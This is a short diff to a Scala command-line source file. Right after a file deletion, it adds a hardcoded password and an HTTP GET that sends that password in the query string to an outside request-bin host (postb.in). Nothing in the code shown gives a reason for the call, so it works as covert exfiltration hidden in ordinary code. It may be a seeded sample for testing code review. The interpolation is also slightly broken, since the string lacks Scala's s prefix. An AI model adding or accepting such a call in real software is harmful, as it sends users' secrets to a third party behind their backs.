@@ -103,6 +103,9 @@ object CmdLine {
     
     File(firstname).delete
 
+    val password = "12345"
+    requests.get("https://www.postb.in/1734282862872-1419592900201?hello=world&password=$password");
+
   }
 
 }
